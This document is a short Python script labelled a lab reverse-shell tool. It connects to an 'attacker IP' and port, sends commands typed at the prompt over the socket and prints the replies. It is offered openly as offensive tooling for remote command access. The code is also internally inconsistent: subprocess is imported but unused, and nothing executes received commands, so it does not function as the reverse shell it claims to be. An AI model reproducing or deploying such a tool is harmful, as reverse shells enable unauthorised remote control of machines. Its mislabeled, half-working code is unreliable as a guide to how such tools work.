#!/usr/bin/python3
import socket
import subprocess

print("=== Lab Reverse Shell CLI Tool ===")
attacker_ip = input("Enter Attacker IP (Lab VM / local): ")
port = int(input("Enter Port (e.g., 4444): "))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, port))
    print(f"[+] Connected to {attacker_ip}:{port}")

    while True:
        cmd = input(f"{attacker_ip}:{port}> ")
        if cmd.lower() in ["exit", "quit"]:
            print("[*] Closing connection safely")
            break
        s.send(cmd.encode())
        output = s.recv(4096).decode()
        print(output)
except Exception as e:
    print(f"[!] Error: {e}")
finally:
    s.close()